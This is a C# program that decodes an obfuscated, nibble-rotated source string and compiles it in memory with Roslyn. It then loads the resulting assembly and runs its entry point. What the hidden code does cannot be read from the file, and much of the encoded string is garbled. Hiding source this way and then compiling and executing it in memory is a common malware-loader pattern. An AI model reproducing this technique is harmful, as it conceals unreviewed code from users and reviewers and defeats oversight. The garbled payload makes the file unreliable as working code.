using System;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using Microsoft.CodeAnalysis;
using Microsoft.CodeAnalysis.CSharp;

class CscRunner
{
    static string RotateRight4Bits(string input)
    {
        char[] result = new char[input.Length];
        for (int i = 0; i < input.Length; i++)
        {
            byte b = (byte)input[i];
            byte rotated = (byte)(((b >> 4) | (b << 4)) & 0xFF);
            result[i] = (char)rotated;
        }
        return new string(result);
    }
    static int Main(string[] args)
    {
        // Source to compile (same program you used previously)
        string source = @"W7æv57GVÖ³Ð W7æv57GVÖâEVG³Ð W7æv57GVÖâÄæ³Ð W7æv57GVÖâ4öÆÆV6Göæ7âtVæV'6³Ð Ð 6Æ77'öv'ÖÐ ·Ð 7GG6göFÔæÐ ·Ð ·Ð õõö&fõ¶äÔ$T&5VS¶f§g&EewE5£Ð ³Ð fG'WVÐ vöGöõõö&fõ¶äÔ$T&5VS¶f§g&EewE5³Ð ·Ð æGÓæG3#õôâÄæVw&GVµÕ·cÂÂÂÂC×³Ð õõö&fõVVud
¥¶Edöæ&EÖ#wvtw%£Ð ³Ð fÃÓæG3#õôâÄæVw&GVµÕ·sÂÂÂÂC×Ð vöGöõõö&fõ$ôôVV' #¤ÄVe&45FS7³Ð ·Ð fRæG3#õôâÄæVw&GVµÕ·#CÂÂÂÂC×ÓÓæG3#õôâÄæVw&GVµÕ·ÂÂÂÂC×Ð ·Ð 4öæ7öÆVâu'GVÄæVõôâDæVw&GVµÕ·ÂSÂcsÂcsÂ3cÂsÂcsÂcs×³Ð ×Ð VÆ7VfRæG3#õôâÄæVw&GVµÕ·CÂÂÂÂC×ÓÓæG3#õôâÄæVw&GVµÕ·ÂÂÂÂC×Ð ·Ð 4öæ7öÆVâu'GVÄæVõôâDæVw&GVµÕ·ÂSÂcsÂcs×³Ð ×Ð VÆ7VfRæG3#õôâÄæVw&GVµÕ·ÂÂÂÂC×ÓÓæG3#õôâÄæVw&GVµÕ·ÂÂÂÂC×Ð ·Ð 4öæ7öÆVâu'GVÄæVõôâDæVw&GVµÕ·3cÂsÂcsÂcs×³Ð ×Ð VÆ7VÐ ·Ð 4öæ7öÆVâu'GVÄæV³Ð ×Ð ×Ð Ð õõö&fõ¤ÔEU ætT eT$T5$'ä7w£Ð ³Ð ²²³Ð vöGöõõö&fõVVud
¥¶Edöæ&EÖ#wvtw%³Ð ×Ð Ð vöGöõõö&fõ¶äÔ$T&5VS¶f§g&EewE5³Ð õõö&fõ$ôôVV' #¤ÄVe&45FS7£Ð ³Ð ×Ð ×Ð ×Ð Ð 7GG66Æ77õôÐ ·Ð  'gGV7GG6&GV%&GVÐ ·Ð æGGÓ³Ð 'VGW'æ&GVGÃÃCÇGããCbdd³Ð ×Ð Ð  W&Æ67GG67G'ævD&GVµÕÐ ·Ð g'&Ó&GVµÕâ4ÆöæV³Ð fö'æGÓ³Ã&âÄVævG³²²Ð &µÕÓ%&µÕ³Ð 'VGW'æTæ6öFævâUEdâtVG5G'æv&³Ð ×Ð Ð  W&Æ67GG6ö&¦V6GÄ&GVµÕ§Ð ·Ð g'Ó&GVµÕ§â4ÆöæV³Ð dWæ6Ã&GVÂ&GVãfÓÓã%³Ð fö'æGÓ³ÃâÄVævG³²²Ð µÕÓfµÕ³Ð fâÄVævGÓÓÐ G'öwæVw'vWÖVæGT6V GöææVw7G'ævæVwµÕ·rTrÂrÖrÂr rÂrGrÂrrÂrrÂrÄrÂrrÂrGrÂrVrÂr'rÂrrÂrÆr×³Ð &GV¶ÓµåÕ³Ð &GVµÕ6ÓæVw&GVµâÄVævGÒÕ³Ð f6âÄVævGãÐ ''â4ö Â6Â6âÄVævG³Ð f6âÄVævGãÐ ''â4ö Â6Â6âÄVævG³Ð 'VGW'ædWæ6Ã&GVÂö&¦V6GãÖÓãÖ7wG6Ð ·Ð cÓã$G4öægV'GV'âEöDöW&ÆV6ÂÂÐ SÓã$G4öægV'GV'âEö5ævÆV6ÂÂÐ CÓã$G4öægV'GV'âEöæGcC6ÂÂÐ 3Óã$G4öægV'GV'âEöæG3#6ÂÂÐ #Óã$G4öægV'GV'âEöæGc6ÂÂÐ Óã6âÄVævGãóö&¦V6G6µÕ£ö&¦V6GÂÐ 3Óã$G4öægV'GV'âEöæG3#6ÂÂÐ cÓã6âÄVævGãÓó$G4öægV'GV'âEöDöW&ÆV6Â£6âÄVævGãÓCó$G4öægV'GV'âEöæG3#6Â£ö&¦V6G6ÂÐ õÓãdWæ6ÃæGÂö&¦V6GãÆVæÓãÆVæ7wG6Ð ·Ð Óã$G4öægV'GV'âEöDöW&ÆV6ÂÂÐ CÓã$G4öægV'GV'âEöæG3#6ÂÂÐ #Óã$G4öægV'GV'âEöæGc6ÂÂÐ Óã6µÕÂÐ ÓãÂÐ õÓãG'öwæVwäöG5W  ö'GVFT6V Göæ""""Ð ×6âÄVævG×¶³Ð ×Ð ×";

        // Parse
        var tree = CSharpSyntaxTree.ParseText(RotateRight4Bits(source));

        // Create metadata references from the runtime's TPA list (robust for .NET Core / .NET 5+)
        var tpa = ((string)AppContext.GetData("TRUSTED_PLATFORM_ASSEMBLIES"))?.Split(Path.PathSeparator) ?? Array.Empty<string>();
        var refs = tpa
            .Where(p => p != null && p.EndsWith(".dll", StringComparison.OrdinalIgnoreCase))
            .Select(p => MetadataReference.CreateFromFile(p))
            .Cast<MetadataReference>()
            .ToList();

        // Always include the currently loaded assemblies that may not be in TPA
        refs.Add(MetadataReference.CreateFromFile(typeof(object).Assembly.Location));
        refs.Add(MetadataReference.CreateFromFile(typeof(Console).Assembly.Location));
        refs = refs.DistinctBy(r => ((PortableExecutableReference)r).FilePath).ToList();

        // Create compilation
        var comp = CSharpCompilation.Create(
            assemblyName: "InMemoryProg",
            syntaxTrees: new[] { tree },
            references: refs,
            options: new CSharpCompilationOptions(OutputKind.ConsoleApplication));

        using var ms = new MemoryStream();
        var result = comp.Emit(ms);

        if (!result.Success)
        {
            Console.WriteLine("Compilation failed:");
            foreach (var diag in result.Diagnostics.Where(d => d.Severity == DiagnosticSeverity.Error))
                Console.WriteLine(diag.ToString());
            return 1;
        }

        ms.Seek(0, SeekOrigin.Begin);
        var assembly = Assembly.Load(ms.ToArray());

        // Capture Console output
        var originalOut = Console.Out;
        var sw = new StringWriter();
        Console.SetOut(sw);

        try
        {
            var entry = assembly.EntryPoint ?? assembly.GetType("Program")?.GetMethod("Main", BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
            if (entry == null) { Console.SetOut(originalOut); Console.WriteLine("No entry point."); return 2; }

            object[] invokeArgs = entry.GetParameters().Length == 0 ? null : new object[] { Array.Empty<string>() };
            var ret = entry.Invoke(null, invokeArgs);
            // If Main returned int, you could return it; otherwise return 0
            if (ret is int exitCode) return exitCode;
        }
        finally
        {
            Console.SetOut(originalOut);
            Console.WriteLine(sw.ToString());
        }

        return 0;
    }
}